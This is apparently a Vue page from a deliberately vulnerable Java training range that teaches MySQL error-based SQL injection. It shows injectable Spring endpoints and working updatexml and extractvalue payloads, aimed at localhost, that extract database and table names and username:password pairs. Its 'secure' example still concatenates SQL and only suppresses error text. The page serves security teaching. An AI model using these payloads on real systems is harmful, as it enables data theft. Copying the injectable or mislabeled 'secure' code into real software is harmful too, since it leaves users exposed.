<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">SQL注入 -- 报错注入</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            报错注入(Error-based SQL Injection)是一种SQL注入技术，通过构造特殊的SQL语句，使数据库在执行时产生错误，从而在错误信息中泄露数据库信息。<br /><br />
                            <span style="color: red;">报错注入的特点：</span><br />
                            1. 不需要回显数据，只需要错误信息<br />
                            2. 可以获取数据库版本、数据库名、表名、列名等信息<br />
                            3. 利用数据库内置函数如updatexml、extractvalue等<br />
                            4. 错误信息会直接返回给客户端，包含敏感信息
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            报错注入漏洞的危害非常严重，攻击者可以通过错误信息获取大量敏感数据：<br /><br />
                            数据库信息泄露：获取数据库版本、数据库名、表结构等；<br />
                            敏感数据获取：通过构造特定的报错语句获取表中的敏感数据；<br />
                            权限提升：获取管理员账户信息，可能导致权限提升；<br />
                            数据泄露：获取用户密码、个人信息等敏感数据；<br />
                            系统信息泄露：可能泄露服务器路径、操作系统信息等。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            【必须】使用预编译语句<br />
                            使用PreparedStatement或MyBatis的#{}占位符，避免字符串拼接。<br /><br />
                            【必须】错误信息过滤<br />
                            禁止将数据库错误信息直接返回给客户端，统一错误处理。<br /><br />
                            【建议】输入验证<br />
                            对用户输入进行严格的类型检查和长度限制。<br /><br />
                            【建议】最小权限原则<br />
                            数据库用户使用最小权限，避免高权限操作。<br /><br />
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <a href="https://www.cnblogs.com/backlion/p/9721687.html" target="_blank" style="text-decoration: underline;">《SQL报错注入详解》</a>：深入学习MySQL报错注入技术。<br />
                            <a href="https://blog.csdn.net/weixin_43921592/article/details/105456456" target="_blank" style="text-decoration: underline;">《MySQL报错注入函数总结》</a>：MySQL报错注入常用函数详解。
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">漏洞代码 - updatexml报错注入 <div>
                            <el-button type="success" round size="mini" @click="fetchDataAndFillTable1">正常查询</el-button>
                            <el-button type="danger" round size="mini" @click="openUpdatexmlDialog">去测试</el-button>
                        </div></el-row>
                        <pre v-highlightjs><code class="java">@GetMapping("/getUserByUsernameError")
public Result getUserByUsernameError(String username) throws Exception {
    List&lt;User&gt; users = new ArrayList&lt;&gt;();
    try {
        //1、注册驱动
        Class.forName("com.mysql.cj.jdbc.Driver");
        //2.获取连接
        Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);
        //3.定义sql语句 - 存在报错注入
        String sql = "select * from user where username = '" + username + "'";
        //4.获取statement对象
        Statement statement = conn.createStatement();
        ResultSet resultSet = statement.executeQuery(sql);
        log.info("sql语句被执行: {}", sql);
        //5.判断是否查询到数据
        while (resultSet.next()) {
            User user = new User();
            user.setId(resultSet.getInt("id"));
            user.setName(resultSet.getString("name"));
            user.setUsername(resultSet.getString("username"));
            users.add(user);
        }
        resultSet.close();
        statement.close();
        conn.close();
        return Result.success(users);
    } catch (Exception e) {
        // 错误信息直接返回，存在信息泄露
        return Result.error("查询失败: " + e.getMessage());
    }
}</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">漏洞代码 - extractvalue报错注入 <div>
                            <el-button type="success" round size="mini" @click="fetchDataAndFillTable4">正常查询</el-button>
                            <el-button type="danger" round size="mini" @click="openExtractvalueDialog">去测试</el-button>
                        </div></el-row>
                        <pre v-highlightjs><code class="java">@GetMapping("/getUserByIdError")
public Result getUserByIdError(String id) throws Exception {
    List&lt;User&gt; users = new ArrayList&lt;&gt;();
    try {
        //1、注册驱动
        Class.forName("com.mysql.cj.jdbc.Driver");
        //2.获取连接
        Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);
        //3.定义sql语句 - 存在报错注入
        String sql = "select * from user where id = " + id;
        //4.获取statement对象
        Statement statement = conn.createStatement();
        ResultSet resultSet = statement.executeQuery(sql);
        log.info("sql语句被执行: {}", sql);
        //5.判断是否查询到数据
        while (resultSet.next()) {
            User user = new User();
            user.setId(resultSet.getInt("id"));
            user.setName(resultSet.getString("name"));
            user.setUsername(resultSet.getString("username"));
            users.add(user);
        }
        resultSet.close();
        statement.close();
        conn.close();
        return Result.success(users);
    } catch (Exception e) {
        // 错误信息直接返回，存在信息泄露
        return Result.error("查询失败: " + e.getMessage());
    }
}</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 统一错误处理 <div>
                                <el-button type="success" round size="mini" @click="fetchDataAndFillTable9">去测试</el-button>
                            </div></el-row>
                        <pre v-highlightjs><code class="java">@GetMapping("/getUserSecByUsername")
public Result getUserSecByUsername(String username) throws Exception {
    List&lt;User&gt; users = new ArrayList&lt;&gt;();

    try {
        //1、注册驱动
        Class.forName("com.mysql.cj.jdbc.Driver");

        //2.获取连接
        Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);

        //3.定义sql语句 - 非预编译，直接拼接
        String sql = "select * from user where username = '" + username + "'";

        //4.获取statement对象
        Statement statement = conn.createStatement();
        ResultSet resultSet = statement.executeQuery(sql);
        log.info("sql语句被执行: {}", sql);

        //5.判断是否查询到数据
        while (resultSet.next()) {
            User user = new User();
            user.setId(resultSet.getInt("id"));
            user.setName(resultSet.getString("name"));
            user.setUsername(resultSet.getString("username"));
            user.setPassword(resultSet.getString("password"));
            users.add(user);
        }

        resultSet.close();
        statement.close();
        conn.close();
        return Result.success(users);
    } catch (Exception e) {
        // 统一错误处理，不泄露详细信息
        log.error("数据库查询异常", e);
        return Result.success("系统繁忙，请稍后重试");
    }
}</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>
        <!-- 打开嵌套表格的对话框 -->
        <el-dialog title="查询用户信息接口" :visible.sync="dialogTableVisible">
            <div v-if="isError">
                <h3 style="color: red;">错误信息：</h3>
                <pre style="background-color: #f5f5f5; padding: 10px; border-radius: 4px;">{{ errorMessage }}</pre>
            </div>
            <div v-else>
                执行的sql语句为: <span v-html="formattedSql"></span>
                <br />
                <br />
                <div v-if="isSafeErrorTest">
                    <h4>返回内容：</h4>
                    <pre style="background-color: #f5f5f5; padding: 10px; border-radius: 4px;">{{ safeErrorResult }}</pre>
                </div>
                <el-table :data="gridData" v-else-if="gridData.length > 0">
                    <el-table-column property="id" label="编号" width="150"></el-table-column>
                    <el-table-column property="name" label="姓名" width="200"></el-table-column>
                    <el-table-column property="username" label="用户名" width="200"></el-table-column>
                    <el-table-column property="password" label="密码" width="200"></el-table-column>
                </el-table>
                <div v-else-if="!isSafeErrorTest">
                    <p>查询结果：{{ resultMessage }}</p>
                </div>
            </div>
        </el-dialog>
        <!-- updatexml报错注入专用弹窗 -->
        <el-dialog title="updatexml报错注入测试" :visible.sync="dialogUpdatexmlVisible" @close="onUpdatexmlDialogClose">
            <div style="margin-bottom: 16px;">
                <el-button type="primary" @click="testUpdatexmlDbName">获取数据库名</el-button>
                <el-button type="primary" @click="testUpdatexmlTableName">获取表名</el-button>
            </div>
            <div v-if="updatexmlPocUrl">
                执行的sql语句为: <span v-html="formattedUpdatexmlSql"></span>
                <br />
            </div>
            <div v-if="updatexmlResult">
                <h4>返回内容：</h4>
                <pre style="background-color: #f5f5f5; padding: 10px; border-radius: 4px;">{{ updatexmlResult }}</pre>
            </div>
        </el-dialog>
        <!-- extractvalue报错注入专用弹窗 -->
        <el-dialog title="extractvalue报错注入测试" :visible.sync="dialogExtractvalueVisible" @close="onExtractvalueDialogClose">
            <div style="margin-bottom: 16px;">
                <el-button type="primary" @click="testExtractvalueVersion">获取版本信息</el-button>
                <el-button type="primary" @click="testExtractvalueUser">获取用户信息</el-button>
            </div>
            <div v-if="extractvaluePocUrl">
                执行的sql语句为: <span v-html="formattedExtractvalueSql"></span>
                <br />
            </div>
            <div v-if="extractvalueResult">
                <h4>返回内容：</h4>
                <pre style="background-color: #f5f5f5; padding: 10px; border-radius: 4px;">{{ extractvalueResult }}</pre>
            </div>
        </el-dialog>
    </div>
</template>

<script>
import { 
    getUserByUsernameError, 
    getUserByIdError, 
    getUserCountError, 
    getUserSecByUsername, 
    getUserSecByUsernameErrorApi
} from '@/api/sqli';

export default {
    data() {
        return {
            activeName: 'first',
            gridData: [],
            pocUrl: '',
            dialogTableVisible: false,
            isError: false,
            errorMessage: '',
            resultMessage: '',
            dialogUpdatexmlVisible: false,
            updatexmlResult: '',
            updatexmlPocUrl: '',
            dialogExtractvalueVisible: false,
            extractvalueResult: '',
            extractvaluePocUrl: '',
            isSafeErrorTest: false,
            safeErrorResult: '',
        };
    },
    computed: {
        formattedSql() {
            if (!this.pocUrl) return '';
            
            // 处理不同的参数类型
            const params = ['username=', 'id=', 'condition='];
            let result = this.pocUrl;
            
            for (const param of params) {
                const index = result.indexOf(param);
                if (index > -1) {
                    const prefix = result.substring(0, index + param.length);
                    const value = decodeURIComponent(result.substring(index + param.length));
                    return prefix + '<span class="sql-param">' + value + '</span>';
                }
            }
            
            return result;
        },
        formattedUpdatexmlSql() {
            if (!this.updatexmlPocUrl) return '';
            const params = ['username='];
            let result = this.updatexmlPocUrl;
            for (const param of params) {
                const index = result.indexOf(param);
                if (index > -1) {
                    const prefix = result.substring(0, index + param.length);
                    const value = decodeURIComponent(result.substring(index + param.length));
                    return prefix + '<span class="sql-param">' + value + '</span>';
                }
            }
            return result;
        },
        formattedExtractvalueSql() {
            if (!this.extractvaluePocUrl) return '';
            const params = ['id='];
            let result = this.extractvaluePocUrl;
            for (const param of params) {
                const index = result.indexOf(param);
                if (index > -1) {
                    const prefix = result.substring(0, index + param.length);
                    const value = decodeURIComponent(result.substring(index + param.length));
                    return prefix + '<span class="sql-param">' + value + '</span>';
                }
            }
            return result;
        },
    },
    methods: {
        handleClick(tab, event) {
            // console.log(tab, event);
        },
        // updatexml报错注入测试
        openUpdatexmlDialog() {
            this.dialogUpdatexmlVisible = true;
            this.updatexmlResult = '';
        },
        testUpdatexmlDbName() {
            const url = "http://127.0.0.1:8080/sqli/error/getUserByUsernameError?username=zhangsan' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ";
            this.updatexmlPocUrl = url;
            getUserByUsernameError({ username: "zhangsan' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- " })
                .then(response => {
                    this.updatexmlResult = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
                })
                .catch(error => {
                    this.updatexmlResult = error.response?.data?.message || error.message;
                });
        },
        testUpdatexmlTableName() {
            const url = "http://127.0.0.1:8080/sqli/error/getUserByUsernameError?username=zhangsan' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- ";
            this.updatexmlPocUrl = url;
            getUserByUsernameError({ username: "zhangsan' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- " })
                .then(response => {
                    this.updatexmlResult = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
                })
                .catch(error => {
                    this.updatexmlResult = error.response?.data?.message || error.message;
                });
        },
        // extractvalue报错注入测试
        fetchDataAndFillTable4() {
            getUserByIdError({ id: '1' })
                .then(response => {
                    this.isError = false;
                    this.pocUrl = "http://127.0.0.1:8080/sqli/error/getUserByIdError?id=1";
                    this.dialogTableVisible = true;
                    this.gridData = response.data;
                })
                .catch(error => {
                    console.error('Error fetching data:', error);
                });
        },
        openExtractvalueDialog() {
            this.dialogExtractvalueVisible = true;
            this.extractvalueResult = '';
            this.extractvaluePocUrl = '';
        },
        onExtractvalueDialogClose() {
            this.extractvaluePocUrl = '';
            this.extractvalueResult = '';
        },
        testExtractvalueVersion() {
            const url = "http://127.0.0.1:8080/sqli/error/getUserByIdError?id=1 and extractvalue(1,concat(0x7e,(select version()),0x7e))";
            this.extractvaluePocUrl = url;
            getUserByIdError({ id: "1 and extractvalue(1,concat(0x7e,(select version()),0x7e))" })
                .then(response => {
                    this.extractvalueResult = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
                })
                .catch(error => {
                    this.extractvalueResult = error.response?.data?.message || error.message;
                });
        },
        testExtractvalueUser() {
            const url = "http://127.0.0.1:8080/sqli/error/getUserByIdError?id=1 and extractvalue(1,concat(0x7e,(select group_concat(username,':',password) from user),0x7e))";
            this.extractvaluePocUrl = url;
            getUserByIdError({ id: "1 and extractvalue(1,concat(0x7e,(select group_concat(username,':',password) from user),0x7e))" })
                .then(response => {
                    this.extractvalueResult = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
                })
                .catch(error => {
                    this.extractvalueResult = error.response?.data?.message || error.message;
                });
        },
        // 安全代码测试
        fetchDataAndFillTable9() {
            this.isSafeErrorTest = true;
            getUserSecByUsernameErrorApi({ username: "zhangsan' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- " })
                .then(response => {
                    this.isError = false;
                    this.pocUrl = "http://127.0.0.1:8080/sqli/error/getUserSecByUsername?username=zhangsan' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ";
                    this.dialogTableVisible = true;
                    this.safeErrorResult = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
                })
                .catch(error => {
                    this.isError = true;
                    this.errorMessage = error.response?.data?.message || error.message;
                    this.pocUrl = "http://127.0.0.1:8080/sqli/error/getUserSecByUsername?username=zhangsan' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ";
                    this.dialogTableVisible = true;
                });
        },
        fetchDataAndFillTable1() {
            getUserByUsernameError({ username: 'zhangsan' })
                .then(response => {
                    this.isError = false;
                    this.pocUrl = "http://127.0.0.1:8080/sqli/error/getUserByUsernameError?username=zhangsan";
                    this.dialogTableVisible = true;
                    this.gridData = Array.isArray(response.data) ? response.data : [];
                })
                .catch(error => {
                    this.isError = true;
                    this.errorMessage = error.response?.data?.message || error.message;
                    this.dialogTableVisible = true;
                });
        },
        onUpdatexmlDialogClose() {
            this.updatexmlPocUrl = '';
            this.updatexmlResult = '';
        },
        onDialogTableClose() {
            this.isSafeErrorTest = false;
            this.safeErrorResult = '';
        },
    }
};
</script>

<style>
.vuln-info {
    border-radius: 10px;
    margin-left: 20px;
    margin-right: 20px;
    margin-bottom: 20px;
    margin-top: 10px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    font-weight: bold;
    padding: 10px;
    justify-content: center;
    align-items: center;
    border-bottom: 1px solid #ccc;
}

.body-div {
    padding: 10px;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
    font-size: 14px;
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;
}

.code-demo {
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    min-height: 36px;
    padding: 10px;
}

.grid-flex {
    margin-bottom: 20px;
}

.sql-param {
    color: red;
    font-weight: bold;
}
</style> 